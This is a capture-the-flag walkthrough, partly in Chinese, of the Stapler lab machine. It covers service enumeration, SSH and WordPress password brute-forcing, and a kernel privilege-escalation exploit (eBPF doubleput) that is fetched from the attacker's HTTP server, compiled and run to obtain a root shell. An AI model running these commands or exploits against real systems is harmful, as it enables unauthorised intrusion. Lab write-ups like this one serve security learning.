# Stapler
![image](https://hackmd.io/_uploads/HJcDfhT2Jg.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -p- 192.168.124.148                     

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-23 12:09 EDT
Stats: 0:02:40 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 12:12 (0:00:06 remaining)
Nmap scan report for 192.168.124.148
Host is up (0.097s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.178
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   tcpwrapped
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   pkzip-file  .ZIP file
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, Support41Auth, SupportsCompression, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ODBCClient, InteractiveClient, FoundRows, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolOld, LongPassword, IgnoreSigpipes, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ']r\x10o%\x0E'H\x0D_7\x08#5~fP=S
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.95%I=7%D=3/23%Time=67E032ED%P=aarch64-unknown-linux-gnu
SF:%r(NULL,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\
...
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 2s, deviation: 4s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-23T16:12:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2025-03-23T16:12:47+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.41 seconds

```
> FTP, HTTP, Samba, SSH, Mysql, 自訂 666

#### 1.2 FTP
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ ftp Anonymous@192.168.124.148                                                                                  
Connected to 192.168.124.148.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
100% |***********************************************************************************************************************************************************************************************|   107        1.22 MiB/s    00:00 ETA
226 Transfer complete.
107 bytes received in 00:00 (1.05 KiB/s)
```
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ cat note                
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

#### 1.3 HTTP
Port `80` & `12380`
```
┌──(chw㉿CHW)-[~]
└─$ dirb http://192.168.124.148/      
...
+ http://192.168.124.148/.bashrc (CODE:200|SIZE:3771)     
+ http://192.168.124.148/.profile (CODE:200|SIZE:675)
-----------------
END_TIME: Sun Mar 23 13:28:05 2025
```
- 查看 http://192.168.124.148/ \
![image](https://hackmd.io/_uploads/H1lK2aT3Jl.png)
- 查看 http://192.168.124.148/.bashrc \
![image](https://hackmd.io/_uploads/ByAS5p6hJg.png)
- 查看 http://192.168.124.148/.profile \
![image](https://hackmd.io/_uploads/rJ6D9Tanye.png)

- 查看 http://192.168.124.148:12380/ \
![image](https://hackmd.io/_uploads/Hyx4TpTnye.png)
> Coming soon Page
> >`<!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! -->`
- https https://192.168.124.148:12380/ \
![image](https://hackmd.io/_uploads/SkNFmRT3yx.png)
>畫面不一樣 ?!

#### 1.4 Samba
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ smbclient -N -L \\\\192.168.124.148\\ 


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            RED

┌──(chw㉿CHW)-[~/Stapler]
└─$ enum4linux -a 192.168.124.148
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 23 13:06:47 2025

 =========================================( Target Information )=========================================
                          
Target ........... 192.168.124.148                                                                                   
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on 192.168.124.148 )==========================
                                        
[+] Got domain/workgroup name: WORKGROUP                                                        
 ==============================( Nbtstat Information for 192.168.124.148 )==============================

Looking up status of 192.168.124.148                       
        RED             <00> -         H <ACTIVE>  Workstation Service
        RED             <03> -         H <ACTIVE>  Messenger Service
        RED             <20> -         H <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         H <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.124.148 )==================================

...
 ================================( Share Enumeration on 192.168.124.148 )================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            RED

[+] Attempting to map shares on 192.168.124.148                        
//192.168.124.148/print$        Mapping: DENIED Listing: N/A Writing: N/A                                           

//192.168.124.148/kathy Mapping: OK Listing: OK Writing: N/A
//192.168.124.148/tmp   Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                             
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                 
//192.168.124.148/IPC$  Mapping: N/A Listing: N/A Writing: N/A

 ==========================( Password Policy Information for 192.168.124.148 )==========================
[+] Attaching to 192.168.124.148 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] RED
        [+] Builtin

[+] Password Info for Domain: RED

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

...

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

[+] Retieved partial password policy with rpcclient:
Password Complexity: Disabled
Minimum Password Length: 5

[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''     
S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)                                               
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                           
S-1-22-1-1000 Unix User\peter (Local User)                 
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```
> `//192.168.124.148/kathy Mapping: OK Listing: OK Writing: N/A`\
`//192.168.124.148/tmp   Mapping: OK Listing: OK Writing: N/A`
>> user 建立成 user.txt

smbclient 查看 share dir
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ cat SMB_Kathy/kathy_stuff/todo-list.txt 
I'm making sure to backup anything important for Initech, Kathy

┌──(chw㉿CHW)-[~/Stapler]
└─$ cat SMB_Kathy/backup/vsftpd.conf 
# Example config file /etc/vsftpd.conf
...
local_root=/etc
...
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO

┌──(chw㉿CHW)-[~/Stapler/SMB_Kathy/backup]
└─$ tar -xzvf wordpress-4.tar.gz

wordpress/
wordpress/wp-settings.php
wordpress/wp-cron.php
wordpress/wp-comments-post.php
wordpress/wp-activate.php
wordpress/wp-admin/
...
```
> ftp conf 與 一坨 Wordpress
#### 1.5 Zip
自定義的 tcp port 666
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ nc 192.168.124.148 666 > file.zip      
                                         
┌──(chw㉿CHW)-[~/Stapler]
└─$ unzip file.zip
Archive:  file.zip
  inflating: message2.jpg
```
![message2](https://hackmd.io/_uploads/S19Wh6a31e.jpg)

>[!Important]
> Recon 總結：
> 1. http://192.168.124.148:12380/ 可能有用途\
> HR `Zoe` \
> Web Server 可能與 `SMB_Kathy/backup/wordpress` 有關
> 2. 可利用 SMB share folder 上傳
> 3. SMB User
> 4. `SMB_Kathy/backup/vsftpd.conf`: rsa key
> 5. mysql

### 2. Hydra SSH
使用 `enum4linux` 收集到的 user.txt，爆破 SSH
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ cat user.tx                     
peter                
RNunemaker
ETollefson
DSwanger
AParnell
...                                        
┌──(chw㉿CHW)-[~/Stapler]
└─$ hydra -L user.tx -P /usr/share/wordlists/rockyou.txt ...
[DATA] attacking ssh://192.168.124.148:22/
[STATUS] 112.00 tries/min, 112 tries in 00:01h, 430331952 to do in 64037:30h, 12 active
```
> 需要好幾天，不太可能

```
┌──(chw㉿CHW)-[~/Stapler]
└─$ hydra -L user.tx -P user.tx ssh://192.168.124.148 -e nsr
...
[22][ssh] host: 192.168.124.148   login: SHayslett   password: SHayslett
....
```
> 成功了...

### 3. HTTP Recon
回去看 `https://192.168.124.148:12380/` 與 `http://192.168.124.148:12380/`\
發現新路徑
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ dirb https://192.168.124.148:12380/
...
---- Scanning URL: https://192.168.124.148:12380/ ----
==> DIRECTORY: https://192.168.124.148:12380/announcements/                     
+ https://192.168.124.148:12380/index.html (CODE:200|SIZE:21)                                                       
==> DIRECTORY: https://192.168.124.148:12380/javascript/                                                            
==> DIRECTORY: https://192.168.124.148:12380/phpmyadmin/                                                            
+ https://192.168.124.148:12380/robots.txt (CODE:200|SIZE:59)                                                       
+ https://192.168.124.148:12380/server-status (CODE:403|SIZE:306)

```
- 瀏覽 https://192.168.124.148:12380/announcements/ \
![image](https://hackmd.io/_uploads/BkPjdR6nkg.png)
> message.txt: `Abby, we need to link the folder somewhere! Hidden at the mo`
- 瀏覽 https://192.168.124.148:12380/robots.txt \
![image](https://hackmd.io/_uploads/SkqONCp2kg.png)
    - 瀏覽 https://192.168.124.148:12380/admin112233/ \
![image](https://hackmd.io/_uploads/r1C9VR6h1g.png)
    - 瀏覽 https://192.168.124.148:12380/blogblog/ \
![image](https://hackmd.io/_uploads/ryfbBA62Je.png)
    - 瀏覽 `view-source:https://192.168.124.148:12380/blogblog/`\
![image](https://hackmd.io/_uploads/ryTEBAp21e.png)
> 可能與 `SMB_Kathy/backup/wordpress` 有關

進到 Wordpress 登入頁面\
![image](https://hackmd.io/_uploads/r1ysBCphkx.png)

- 瀏覽 https://192.168.124.148:12380/phpmyadmin/ \
![image](https://hackmd.io/_uploads/HyBlKAp3kg.png)
> view-source:https://192.168.124.148:12380/phpmyadmin/ 中取得 
>`https://192.168.124.148:12380/phpmyadmin/doc/html/index.html` \
> ![image](https://hackmd.io/_uploads/HkiY90an1l.png)
> > phpMyAdmin 4.5.4.1
> > `searchsploit phpMyAdmin 4.5`: 沒有結果

### 4. WPscan
```
┌──(chw㉿CHW)-[~]
└─$ wpscan --url https://192.168.124.148:12380/blogblog/ --enumerate p --plugins-detection aggressive  --disable-tls-checks
...
[+] WordPress theme in use: bhost
 | Location: https://192.168.124.148:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2025-03-07T00:00:00.000Z
 | Readme: https://192.168.124.148:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.9
 | Style URL: https://192.168.124.148:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
...
[+] two-factor
 | Location: https://192.168.124.148:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.12.0
 | Last Updated: 2025-02-14T15:58:00.000Z
 | Readme: https://192.168.124.148:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [!] Directory listing is enabled
...
┌──(chw㉿CHW)-[~]
└─$ wpscan --url https://192.168.124.148:12380/blogblog/ --enumerate u  --disable-tls-checks
[i] User(s) Identified:

[+] John Smith
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] peter
[+] barry
[+] heather
[+] harry
[+] scott
[+] kathy
[+] tim
```
> Plugin: `bhost`\
> User 建立 wpuser.txt

使用 cewl 與 密碼爆破
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ cat wpuser.txt  
John Smith
john
garry
elly
peter
barry
...
┌──(chw㉿CHW)-[~/Stapler]
└─$ cewl -w custom_wordlist.txt https://192.168.124.148:12380/blogblog/
┌──(chw㉿CHW)-[~/Stapler]
└─$ ┌──(chw㉿CHW)-[~/Stapler]
└─$ wpscan --url https://192.168.124.148:12380/blogblog/ -U wpuser.txt -P custom_wordlist.txt --force --disable-tls-checks
...
[+] Performing password attack on Xmlrpc Multicall against 11 user/s
[SUCCESS] - tim / thumb
[SUCCESS] - garry / football 
```

>[!Important]
>總結：
>- SSH: `SHayslett:SHayslett`\
>- Wordpress: `tim:thumb` & `garry:football`
>
>還沒利用的弱點：
>- Wordpress bhost
>- phpMyadmin login
>- mysql
>- SMB share folder 上傳
>- `SMB_Kathy/backup/vsftpd.conf`: rsa key


### 5. SSH Login
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ ssh SHayslett@192.168.124.148
...
SHayslett@red:~$ whoami
SHayslett
SHayslett@red:~$ pwd
/home/SHayslett

```
### ✅ Get User Flag
> 在 `/home/`找到 User flag
## Privileges Escalation

### 6. 確認 User
```
SHayslett@red:/$ ls /home
AParnell  Drew      elly        jamie  JKanode  local.txt  MBassin  NATHAN      Sam        SStroud  zoe
CCeaser   DSwanger  ETollefson  JBare  JLipps   LSolum     mel      peter       SHAY       Taylor
CJoo      Eeth      IChadwick   jess   kai      LSolum2    MFrei    RNunemaker  SHayslett  www
SHayslett@red:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
messagebus:x:108:111::/var/run/dbus:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
AParnell:x:1004:1004::/home/AParnell:/bin/bash
SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
MBassin:x:1006:1006::/home/MBassin:/bin/bash
JBare:x:1007:1007::/home/JBare:/bin/bash
LSolum:x:1008:1008::/home/LSolum:/bin/bash
IChadwick:x:1009:1009::/home/IChadwick:/bin/false
MFrei:x:1010:1010::/home/MFrei:/bin/bash
SStroud:x:1011:1011::/home/SStroud:/bin/bash
CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
JKanode:x:1013:1013::/home/JKanode:/bin/bash
CJoo:x:1014:1014::/home/CJoo:/bin/bash
Eeth:x:1015:1015::/home/Eeth:/usr/sbin/nologin
LSolum2:x:1016:1016::/home/LSolum2:/usr/sbin/nologin
JLipps:x:1017:1017::/home/JLipps:/bin/sh
jamie:x:1018:1018::/home/jamie:/bin/sh
Sam:x:1019:1019::/home/Sam:/bin/zsh
Drew:x:1020:1020::/home/Drew:/bin/bash
jess:x:1021:1021::/home/jess:/bin/bash
SHAY:x:1022:1022::/home/SHAY:/bin/bash
Taylor:x:1023:1023::/home/Taylor:/bin/sh
mel:x:1024:1024::/home/mel:/bin/bash
kai:x:1025:1025::/home/kai:/bin/sh
zoe:x:1026:1026::/home/zoe:/bin/bash
NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
www:x:1028:1028::/home/www:
postfix:x:112:118::/var/spool/postfix:/bin/false
ftp:x:110:116:ftp daemon,,,:/var/ftp:/bin/false
elly:x:1029:1029::/home/elly:/bin/bash

```
### 7. Sudo -l
```
SHayslett@red:/$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for SHayslett: 
Sorry, user SHayslett may not run sudo on red.
```
> SHayslett 沒有 sudo 權限

### 8. Writable File
```
SHayslett@red:/$ find / -writable -type d 2>/dev/null
/var/www/https/blogblog/wp-content/uploads
/var/crash
/var/tmp
/var/spool/samba
/var/lib/php/sessions
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service/init.scope
/proc/8497/task/8497/fd
/proc/8497/fd
/proc/8497/map_files
...
```
> 沒有可用資訊

### 9. System
```
SHayslett@red:/$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
SHayslett@red:/$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
```
(Kali)
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ searchsploit Linux red 4.4  
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) | linux/local/9479.c
Redis-cli < 5.0 - Buffer Overflow (PoC)                                            | linux/local/44904.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                     
┌──(chw㉿CHW)-[~/Stapler]
└─$ searchsploit Ubuntu 16.04 
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                   | linux/local/40937.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                      | linux/local/40054.c
Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbn | linux/local/40943.txt
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation          | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / C | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'lds | linux_x86/local/42276.c
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps              | linux/dos/39773.txt
Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary Fi | linux/local/45175.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)    | linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak | linux/dos/46529.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privil | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condi | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege  | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escala | linux/local/40489.txt
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                         | linux/dos/45919.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation      | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation             | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privi | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escala | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Lo | linux/local/47169.c
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
查看 exploit
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ searchsploit -x 41923
┌──(chw㉿CHW)-[~/Stapler]
└─$ searchsploit -x 39772                                
┌──(chw㉿CHW)-[~/Stapler]
└─$ searchsploit -m 39772
```
### 10. exploit
```
┌──(chw㉿CHW)-[~/Stapler]
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
┌──(chw㉿CHW)-[~/Stapler]
└─$ python3 -m http.server 80                                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```


```
SHayslett@red:/$ cd /tmp
SHayslett@red:/tmp$ wget http://192.168.45.178/39772.zip
SHayslett@red:/tmp$ unzip 39772.zip
SHayslett@red:/tmp$ cd 39772
SHayslett@red:/tmp/39772$ ls
crasher.tar  exploit.tar
SHayslett@red:/tmp/39772$ tar -vxf exploit.tar 
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
SHayslett@red:/tmp/39772$ cd ebpf_mapfd_doubleput_exploit/
SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ chmod +x *
SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# whoami
root
root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
root@red:/root# ls
fix-wordpress.sh  flag.txt  issue  proof.txt  wordpress.sql
```
### ✅ Get Root FLAG
